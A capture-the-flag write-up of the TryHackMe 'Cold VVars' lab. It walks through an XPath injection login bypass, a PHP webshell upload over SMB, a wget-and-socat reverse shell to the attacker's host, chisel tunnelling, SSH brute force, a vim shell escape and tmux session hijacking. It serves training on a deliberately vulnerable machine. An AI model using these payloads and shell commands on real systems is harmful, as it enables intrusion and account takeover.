# Cold VVars

## Introduction

Welcome to my another writeup! In this TryHackMe [Cold VVars](https://tryhackme.com/room/coldvvars) room, you'll learn: XPath injection, hijacking Tmux session and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to ArthurMorgan](#privilege-escalation)**
4. **[Privilege Escalation: ArthurMorgan to marston](#arthurMorgan-to-marston)**
5. **[Privilege Escalation: marston to root](#marston-to-root)**
6. **[Conclusion](#conclusion)**

## Background

> Part of Incognito CTF
>  
> Difficulty: Medium

---

Part of [Incognito 2.0 CTF](https://ctftime.org/event/1321)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|15:54:28(HKT)]
└> export RHOSTS=10.10.207.207
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|15:54:43(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE     REASON         VERSION
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        syn-ack ttl 63 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
[...]
```

According to `rustscan` result, we have 4 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|139,445           | Samba smbd 4.7.6-Ubuntu       |
|8080              | Apache httpd 2.4.29 ((Ubuntu))|
|8082              | Node.js Express               |

### SMB on Port 445

**Listing shares:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|15:54:43(HKT)]
└> smbclient -L \\$RHOSTS         
Password for [WORKGROUP\nam]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	SECURED         Disk      Dev
	IPC$            IPC       IPC Service (incognito server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            INCOGNITO
```

- Found non default share: `SECURED`

**Try to login as guest to share `SECURED`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:03:01(HKT)]
└> smbclient //$RHOSTS/SECURED           
Password for [WORKGROUP\nam]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Nope. It doesn't allow guest login.

**Enum4linux:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|15:54:43(HKT)]
└> enum4linux $RHOSTS
[...]
S-1-5-21-4106797096-1993237748-2647641412-1000 INCOGNITO\ArthurMorgan (Local User)
```

- Found local user: `ArthurMorgan`

### HTTP on Port 8080

**Adding a new host to `/etc/hosts`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:03:21(HKT)]
└> echo "$RHOSTS coldvvars.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120160553.png)

A default Apache page.

**Let's enumerate hidden directories and files via `gobuster`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|15:59:10(HKT)]
└> gobuster dir -u http://coldvvars.thm:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
[...]
/index.php            (Status: 200) [Size: 4]

┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:08:05(HKT)]
└> gobuster dir -u http://coldvvars.thm:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 
[...]
/dev                  (Status: 301) [Size: 319] [--> http://coldvvars.thm:8080/dev/]
```

**`/index.php`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:09:51(HKT)]
└> curl http://coldvvars.thm:8080/index.php    
Data
```

No idea what it is.

Maybe we could fuzz the GET/POST parameter.

**`/dev`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:10:40(HKT)]
└> curl http://coldvvars.thm:8080/dev/    
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at coldvvars.thm Port 8080</address>
</body></html>
```

When we try to reach `/dev/`, it returns 403 Forbidden HTTP status.

**Let's enumerate this directory:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:13:39(HKT)]
└> gobuster dir -u http://coldvvars.thm:8080/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]

┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:16:10(HKT)]
└> gobuster dir -u http://coldvvars.thm:8080/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -x php,txt,bak,zip,tar 
[...]
/note.txt             (Status: 200) [Size: 45]
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:17:53(HKT)]
└> curl http://coldvvars.thm:8080/dev/note.txt  
Secure File Upload and Testing Functionality
```

Nope. Nothing.

### HTTP on Port 8082

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120161724.png)

After poking around the site, I found that this is a template page.

**Again, enumerate hidden directories and files:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:25:53(HKT)]
└> gobuster dir -u http://coldvvars.thm:8082/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 
[...]
/login                (Status: 200) [Size: 1605]
/static               (Status: 301) [Size: 179] [--> /static/]
/Login                (Status: 200) [Size: 1605]
/Static               (Status: 301) [Size: 179] [--> /Static/]
/LOGIN                (Status: 200) [Size: 1605]
/STATIC               (Status: 301) [Size: 179] [--> /STATIC/]
```

- Found hidden directory: `/login`

**`/login`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120162906.png)

Let's try to guess an administrator level user credentials, like `admin:admin`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120162939.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120162953.png)

Burp Suite HTTP histrory:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120163046.png)

When we clicked the "Login" button, it'll send a POST request to `/login`, with parameter `username`, `password`, `submit`.

## Initial Foothold

Let's try simple SQL injection to bypass the authentication:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120163613.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120163618.png)

Nope.

Maybe it's using NoSQL DBMS (Database Management System) like MongoDB?

**Also, to automate things, I'll write a Python script:**
```py
#!/usr/bin/env python3

import requests
import logging

class Login:
    def __init__(self, url):
        self.__url = url

    def sendRequest(self, payload):
        logging.info(f'Payload: {payload}')

        loginData = {
            'username': payload,
            'password': 'anything',
            'submit': 'Login'
        }

        requestResult = requests.post(self.__url, data=loginData)
        logging.info(requestResult.text)

def main():
    logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

    url = 'http://coldvvars.thm:8082/login'
    login = Login(url)

    payload = """"""
    login.sendRequest(payload)

if __name__ == '__main__':
    main()
```

NoSQL injection authentication bypass:

```py
loginData = {
    'username[$eq]': payload,
    'password[$eq]': 'hi',
    'submit': 'Login'
}

payload = """hi"""
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|16:59:29(HKT)]
└> python3 login.py
[INFO] Payload: hi
[INFO] Username or Password Wrong
```

Nope.

Hmm... How about XPath (XML Path Language) injection?

XPath injection vulnerabilities arise when user-controllable data is incorporated into XPath queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.

Depending on the purpose for which the vulnerable query is being used, an attacker may be able to exploit an XPath injection flaw to read sensitive application data or interfere with application logic.

**If the application doesn't filter any XPath metacharacters such as `"'/@=*[](and)`, it's very likely to be vulnerable to XPath injection.**

According to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection#exploitation), we can use these payloads:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120173216.png)

**After some testing, I found this payload worked:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:33:08(HKT)]
└> python3 login.py
[INFO] Payload: " or 1=1 or "x"="y
[INFO] Username Password<br>Tove             {Redacted}<br>Godzilla             {Redacted}<br>SuperMan             {Redacted}<br>ArthurMorgan             {Redacted}<br>
```

Found usernames and passwords!

Let's login to their account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120173459.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120173508.png)

Hmm... Nothing.

Let's take a step back.

We still have 1 more service need to dig deeper: SMB.

**Since we have pairs of credentials, we can do password spraying:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:53:37(HKT)]
└> enum4linux -u "ArthurMorgan" -p "{Redacted}" $RHOSTS
[...]
[+] Server 10.10.207.207 allows sessions using username 'ArthurMorgan', password '{Redacted}'
[...]
```

Found a valid account in SMB!

**Let's connect to `SECURED` share!**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:55:00(HKT)]
└> smbclient //$RHOSTS/SECURED -U ArthurMorgan%{Redacted}
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Mar 22 07:04:28 2021
  ..                                  D        0  Thu Mar 11 20:52:29 2021
  note.txt                            A       45  Thu Mar 11 20:19:52 2021
```

The `note.txt` is the same that we've found in HTTP on port 8080 `/dev/note.txt`.

**Now, let's test if we can upload a file or not:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:56:18(HKT)]
└> touch anything

smb: \> put anything
putting file anything as \anything (0.0 kb/s) (average 0.0 kb/s)
smb: \> dir
  .                                   D        0  Fri Jan 20 17:56:25 2023
  ..                                  D        0  Thu Mar 11 20:52:29 2021
  note.txt                            A       45  Thu Mar 11 20:19:52 2021
  anything                            A        0  Fri Jan 20 17:56:25 2023

┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:56:03(HKT)]
└> curl http://coldvvars.thm:8080/dev/anything
```

We can! And we're able to access the uploaded file in HTTP on port 8080 `/dev/<file>`!

**Armed with above information, we can upload a PHP webshell!**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:57:54(HKT)]
└> echo '<?php system($_GET["cmd"]);?>' > webshell.php

smb: \> put webshell.php
putting file webshell.php as \webshell.php (0.0 kb/s) (average 0.0 kb/s)

┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:58:18(HKT)]
└> curl http://coldvvars.thm:8080/dev/webshell.php --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Boom! We have Remote Code Execution (RCE)!

Let's get a reverse shell!

- Setup a listener: (I'm using `socat` for stable shell)

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:59:00(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443      
2023/01/20 17:59:19 socat[86628] N opening character device "/dev/pts/1" for reading and writing
2023/01/20 17:59:19 socat[86628] N listening on AF=2 0.0.0.0:443
```

```shell
┌[root♥siunam]-(/opt/static-binaries/binaries/linux/x86_64)-[2023.01.20|17:58:56(HKT)]-[git://master ✗]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Send the payload:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:59:57(HKT)]
└> curl http://coldvvars.thm:8080/dev/webshell.php --get --data-urlencode "cmd=wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|17:59:00(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443      
2023/01/20 17:59:19 socat[86628] N opening character device "/dev/pts/1" for reading and writing
2023/01/20 17:59:19 socat[86628] N listening on AF=2 0.0.0.0:443
                                                                2023/01/20 18:00:38 socat[86628] N accepting connection from AF=2 10.10.207.207:57658 on AF=2 10.9.0.253:443
                                                                 2023/01/20 18:00:38 socat[86628] N starting data transfer loop with FDs [5,5] and [7,7]
                                             www-data@incognito:/var/www/html/dev$ 
www-data@incognito:/var/www/html/dev$ export TERM=xterm-256color
www-data@incognito:/var/www/html/dev$ stty rows 22 columns 107
www-data@incognito:/var/www/html/dev$ ^C
www-data@incognito:/var/www/html/dev$ whoami;hostname;id;ip a
www-data
incognito
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:10:08:a6:9f:51 brd ff:ff:ff:ff:ff:ff
    inet 10.10.207.207/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3197sec preferred_lft 3197sec
    inet6 fe80::10:8ff:fea6:9f51/64 scope link 
       valid_lft forever preferred_lft forever
www-data@incognito:/var/www/html/dev$ 
```

I'm user `www-data`!

**user.txt:**
```shell
www-data@incognito:/var/www/html/dev$ cat /home/ArthurMorgan/user.txt 
{Redacted}
```

## Privilege Escalation

### www-data to ArthurMorgan

Let's do some basic enumerations!

**System users:**
```shell
www-data@incognito:/var/www/html/dev$ cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
ArthurMorgan:x:1001:1002::/home/ArthurMorgan:/bin/sh
marston:x:1002:1003::/home/marston:/bin/bash

www-data@incognito:/var/www/html/dev$ ls -lah /home
total 16K
drwxr-xr-x  4 root         root         4.0K Mar 21  2021 .
drwxr-xr-x 25 root         root         4.0K May 28  2021 ..
drwxr-xr-x  6 ArthurMorgan ArthurMorgan 4.0K May 28  2021 ArthurMorgan
drwxr-xr-x  8 marston      marston      4.0K May 29  2021 marston
```

- Found 2 system user: `ArthurMorgan`, `marston`

**Weird files in `/opt`:**
```shell
www-data@incognito:/var/www/html/dev$ ls -lah /opt
total 16K
drwxr-xr-x  3 root root 4.0K Mar 23  2021 .
drwxr-xr-x 25 root root 4.0K May 28  2021 ..
drwx--x--x  2 root root 4.0K Mar 23  2021 file
-rwxr-xr-x  1 root root   53 Mar 23  2021 test.sh
```

```shell
www-data@incognito:/var/www/html/dev$ cat /opt/test.sh 
#!/bin/sh
touch /opt/da
echo $(which tmux) > /opt/da
```

No clue what is it.

**Listening ports:**
```shell
www-data@incognito:/var/www/html/dev$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8082            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
udp        0      0 10.10.255.255:137       0.0.0.0:*                           -                   
udp        0      0 10.10.207.207:137       0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
udp        0      0 10.10.255.255:138       0.0.0.0:*                           -                   
udp        0      0 10.10.207.207:138       0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.207.207:68        0.0.0.0:*                           -
```

- Found local loopback SSH service

Hmm... Since we now have a list of passwords, we can **port forwarding the SSH service**, and brute force those 2 system users' password.

To do so, I'll use `chisel`:

- Transfer the `chisel` binary:

```shell
┌[root♥siunam]-(/opt/chisel)-[2023.01.20|18:10:31(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@incognito:/var/www/html/dev$ wget http://10.9.0.253/chiselx64 -O /tmp/chisel;chmod +x /tmp/chisel
```

- Setup a server listener:

```shell
┌[root♥siunam]-(/opt/chisel)-[2023.01.20|18:11:36(HKT)]
└> ./chiselx64 server --reverse -p 8888
2023/01/20 18:11:38 server: Reverse tunnelling enabled
2023/01/20 18:11:38 server: Fingerprint SDQlJxI8vbgkcy0Zq9Xk4YUPU0/jNbPv0b+HHn5pS7E=
2023/01/20 18:11:38 server: Listening on http://0.0.0.0:8888
```

- Connect to the server:

```shell
www-data@incognito:/var/www/html/dev$ /tmp/chisel client 10.9.0.253:8888 R:2222:127.0.0.1:22
2023/01/20 10:12:19 client: Connecting to ws://10.9.0.253:8888
2023/01/20 10:12:20 client: Connected (Latency 214.984362ms)
```

**Now, we can brute force the SSH service via `hydra`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Cold-VVars)-[2023.01.20|18:13:41(HKT)]
└> hydra -L user.txt -P pass.txt ssh://127.0.0.1 -s 2222
[...]
[2222][ssh] host: 127.0.0.1   login: ArthurMorgan   password: {Redacted}
```

Found user `ArthurMorgan`'s password!

**Let's Switch User to `ArthurMorgan`:**
```shell
^C2023/01/20 10:14:28 client: Disconnected
2023/01/20 10:14:28 client: Give up
www-data@incognito:/var/www/html/dev$ su ArthurMorgan
Password: 
$ /bin/bash
ArthurMorgan@incognito:/var/www/html/dev$ whoami;hostname;id;ip a
ArthurMorgan
incognito
uid=1001(ArthurMorgan) gid=1002(ArthurMorgan) groups=1002(ArthurMorgan),1001(smbgrp)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:10:08:a6:9f:51 brd ff:ff:ff:ff:ff:ff
    inet 10.10.207.207/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2375sec preferred_lft 2375sec
    inet6 fe80::10:8ff:fea6:9f51/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `ArthurMorgan`!

### ArthurMorgan to marston

**Let's check our home directory!**
```shell
ArthurMorgan@incognito:/var/www/html/dev$ cd ~
ArthurMorgan@incognito:~$ ls -lah
total 32K
drwxr-xr-x 6 ArthurMorgan ArthurMorgan 4.0K May 28  2021 .
drwxr-xr-x 4 root         root         4.0K Mar 21  2021 ..
lrwxrwxrwx 1 root         root            9 Mar 23  2021 .bash_history -> /dev/null
drwx------ 2 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .cache
drwxr-x--- 3 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .config
drwx------ 4 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .gnupg
-rw-r--r-- 1 ArthurMorgan ArthurMorgan   56 Mar 21  2021 ideas
drwxrwxr-x 3 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .local
-rw-r--r-- 1 ArthurMorgan ArthurMorgan   33 Mar 21  2021 user.txt
```

```shell
ArthurMorgan@incognito:~$ cat ideas 
I don't know why I don't get any ideas to write here...
```

Nothing useful.

**`pspy`:**
```shell
┌[root♥siunam]-(/opt/pspy)-[2023.01.20|18:25:47(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
ArthurMorgan@incognito:~$ wget http://10.9.0.253/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy;/tmp/pspy
[...]
2023/01/20 10:26:35 CMD: UID=1002 PID=1332   | ssh root@localhost 
2023/01/20 10:26:35 CMD: UID=1002 PID=1331   | sshpass -p {Redacted} ssh root@localhost 
2023/01/20 10:26:35 CMD: UID=1002 PID=1324   | python3 /home/marston/hicckup.py
[...]
2023/01/20 10:27:01 CMD: UID=0    PID=5598   | /usr/sbin/CRON -f 
2023/01/20 10:27:01 CMD: UID=0    PID=5597   | /usr/sbin/CRON -f 
2023/01/20 10:27:01 CMD: UID=1002 PID=5599   | /bin/bash /home/marston/run.sh 
2023/01/20 10:27:01 CMD: UID=1002 PID=5603   | /bin/bash /home/marston/run.sh 
2023/01/20 10:27:01 CMD: UID=1002 PID=5602   | /bin/bash /home/marston/run.sh 
2023/01/20 10:27:01 CMD: UID=1002 PID=5601   | /bin/bash /home/marston/run.sh 
2023/01/20 10:27:01 CMD: UID=1002 PID=5600   | /bin/bash /home/marston/run.sh 
2023/01/20 10:27:01 CMD: UID=1002 PID=5607   | /bin/bash /home/marston/run.sh 
2023/01/20 10:27:01 CMD: UID=1002 PID=5606   | /bin/bash /home/marston/run.sh 
2023/01/20 10:27:01 CMD: UID=1002 PID=5605   | /bin/bash /home/marston/run.sh 
2023/01/20 10:27:01 CMD: UID=1002 PID=5604   | /bin/bash /home/marston/run.sh 
[...]
2023/01/20 10:28:01 CMD: UID=1002 PID=5613   | /bin/bash /home/marston/run.sh 
2023/01/20 10:28:01 CMD: UID=1002 PID=5612   | /bin/sh -c /home/marston/run.sh 
2023/01/20 10:28:01 CMD: UID=0    PID=5611   | /usr/sbin/CRON -f 
2023/01/20 10:28:01 CMD: UID=1002 PID=5617   | wc -l 
2023/01/20 10:28:01 CMD: UID=1002 PID=5616   | /bin/bash /home/marston/run.sh 
2023/01/20 10:28:01 CMD: UID=1002 PID=5615   | /bin/bash /home/marston/run.sh 
2023/01/20 10:28:01 CMD: UID=1002 PID=5614   | /bin/bash /home/marston/run.sh 
2023/01/20 10:28:01 CMD: UID=1002 PID=5621   | /bin/bash /home/marston/run.sh 
2023/01/20 10:28:01 CMD: UID=1002 PID=5620   | /bin/bash /home/marston/run.sh 
2023/01/20 10:28:01 CMD: UID=1002 PID=5619   | /bin/bash /home/marston/run.sh 
2023/01/20 10:28:01 CMD: UID=1002 PID=5618   | /bin/bash /home/marston/run.sh
```

So there is a cronjob that running `/bin/bash /home/marston/run.sh` every minute. However, we don't have access to that sh script file...

In here, I didn't find anything useful in manual enumeration and low hanging fruits. Let's use LinPEAS.

**LinPEAS:**
```shell
┌[root♥siunam]-(/usr/share/peass/linpeas)-[2023.01.20|18:35:55(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
ArthurMorgan@incognito:~$ curl -s http://10.9.0.253/linpeas.sh | sh
[...]
                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
[...]
marston    931  0.0  0.3  28604  1680 ?        Ss   07:54   0:00 tmux new-session -d
[...]
╔══════════╣ Login now
 10:37:20 up  2:44, 20 users,  load average: 0.38, 0.10, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
marston  pts/0    tmux(931).%0     07:54    2:42m  0.87s  0.87s -bash
marston  pts/1    tmux(931).%1     07:54    2:42m  1.25s  1.25s -bash
marston  pts/2    tmux(931).%2     07:54    2:42m  0.94s  0.94s -bash
marston  pts/3    tmux(931).%3     07:54    2:42m  0.48s  0.48s -bash
marston  pts/4    tmux(931).%4     07:54    2:42m  0.56s  0.56s -bash
marston  pts/5    tmux(931).%5     07:54    2:42m  0.95s  0.95s -bash
marston  pts/6    tmux(931).%6     07:54    2:42m  0.95s  0.95s -bash
marston  pts/7    tmux(931).%7     07:54    2:42m  0.65s  0.65s -bash
marston  pts/8    tmux(931).%8     07:54    2:42m  0.95s  0.95s -bash
marston  pts/9    tmux(931).%9     07:54    2:42m  0.48s  0.48s -bash
marston  pts/10   tmux(931).%10    07:54    2:42m  0.79s  0.79s -bash
marston  pts/11   tmux(931).%11    07:54    2:41m  0.93s  0.00s sshpass -p {Redacted} ssh root@localhost
marston  pts/12   tmux(931).%12    07:54    2:42m  0.80s  0.80s -bash
marston  pts/13   tmux(931).%13    07:55    2:42m  1.18s  1.18s -bash
marston  pts/14   tmux(931).%14    07:55    2:42m  0.87s  0.87s -bash
marston  pts/15   tmux(931).%15    07:55    2:41m  0.87s  0.87s -bash
marston  pts/16   tmux(931).%16    07:55    2:42m  0.93s  0.93s -bash
marston  pts/17   tmux(931).%17    07:55    2:42m  0.95s  0.95s -bash
marston  pts/18   tmux(931).%18    07:55    2:42m  0.56s  0.56s -bash
root     pts/20   127.0.0.1        07:55    2:41m  0.55s  0.55s -bash
[...]
╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6

marston    931  0.0  0.3  28604  1600 ?        Ss   07:54   0:00 tmux new-session -d
/tmp/tmux-1001
[...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120183826.png)

Hmm... There is a Tmux session which is owned by user `marston`.

I never seen this before. Let's go to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120184349.png)

So we can **hijack a tmux session via attaching it**?

```shell
ArthurMorgan@incognito:~$ tmux ls
error connecting to /tmp/tmux-1001/default (No such file or directory)
```

Wait, error connecting??

After wasting tons of time, I missed one thing:

**Environment variable:**
```shell
ArthurMorgan@incognito:~$ env
[...]
OPEN_PORT=4545
[...]
```

In the environment variable, it has a variable called `OPEN_PORT`, and it's value is `4545`!!!

Umm... We didn't saw that port is opened in `netstat` command. Also, there is a cronjob doing something weird.

That being said, maybe there is a cronjob that keeps connecting to localhost on port 4545??

**Let's use `nc` to listen on port 4545:**
```shell
ArthurMorgan@incognito:~$ nc -lnvp 4545
Listening on [0.0.0.0] (family 0, port 4545)
Connection from 127.0.0.1 37776 received!


ideaBox
1.Write
2.Delete
3.Steal others' Trash
4.Show'nExit
```

Ah! Found you!

In here, we have 4 options.

**Let's explore them:**
```shell
1
Start Typing
hello

Written
==============

2

Deleted
===============

3
===============
Blank
I don't know why I don't get any ideas to write here...
===============

4
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120190715.png)

??? Why we're inside a `vim` editor??

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#shell), we can spawn a shell in `vim`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120190912.png)

Let's do that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120191004.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120191017.png)

I'm user `marston`!

**Then spawn a PTY shell:**
```shell
python3 -c "import pty;pty.spawn('/bin/bash')"
marston@incognito:~$ 
```

### marston to root

**Now, we should able to list `tmux` sessions:**
```shell
marston@incognito:~$ tmux ls
0: 9 windows (created Fri Jan 20 07:54:43 2023) [80x24]
```

Nice!!

**Let's attach that session!**
```shell
marston@incognito:~$ export TERM=xterm-256color
marston@incognito:~$ stty rows 47 columns 212
marston@incognito:~$ tmux attach -t "0"
```

